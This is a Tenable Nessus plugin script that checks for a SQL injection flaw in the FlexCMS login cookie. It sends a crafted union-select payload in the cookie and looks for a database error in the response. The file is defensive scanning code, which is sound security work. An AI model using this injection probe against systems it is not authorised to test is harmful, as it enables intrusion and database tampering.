#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(40824);
  script_version("$Revision: 1.8 $");

  script_bugtraq_id(36179);
  script_osvdb_id(57571);
  script_xref(name:"Secunia", value:"36513");
  script_xref(name:"Secunia", value:"36528");

  script_name(english:"FlexCMS Login Cookie SQL Injection");
  script_summary(english:"Tries to inject SQL statements into login Cookie");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );

  script_set_attribute(attribute:"description", value:
"The remote host is running FlexCMS, a content management system 
written in PHP. The version of the FlexCMS installed on the remote 
host fails to sanitize input passed to the login cookie 
'FCLoginData12345' before using it in database queries. Provided
PHP's 'magic_quotes_gpc' setting is disabled, an attacker may be able 
to exploit this issue to manipulate database queries, leading to 
disclosure of sensitive information, modification of data, or 
attacks against the underlying database." );

  script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/0908-exploits/flexcms25-sql.txt" );

  script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/28");
  #script_set_attribute(attribute:"patch_publication_date", value:"9999/99/99"); Patch is not out yet. 
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/08/31");

 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port))  exit(0, "The web server does not support PHP.");

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/flexcms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/index.php/index.html");

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");
 
  if (
    ">Management Login<" >< res[2] && 
    ">FlexCMS<" >< res[2]
  )
  {
    set_http_cookie(
      name :"FCLoginData12345",
      value:"nessus' union select 1,2,3,4,nessus==1"
    );
 
    #Send our exploit, and see if we can generate a error message.
    res = http_send_recv3(
         method:"GET",
         item:url,
         port:port);
    if (isnull(res)) exit(1, "The web server failed to respond.");

    req = http_last_sent_request();

    if("You have an error in your SQL syntax" >< res[2])
    {
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

      if(report_verbosity > 0)
      {
        report = string ('\n',
          "Nessus was able to verify this issue by generating a database error\n",
          "in reponse to the following GET request :\n\n",
          str_replace(find:'\n', replace:'\n  ', string:req),'\n');
      
        if(report_verbosity > 1)
        {
          error = strstr(res[2], 'You have an error in your SQL syntax'); 
          report = string(report,'\n',
            "Here's the error message : \n\n",
             crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n\n",
             error,"\n\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n");
        }
        security_hole(port:port,extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
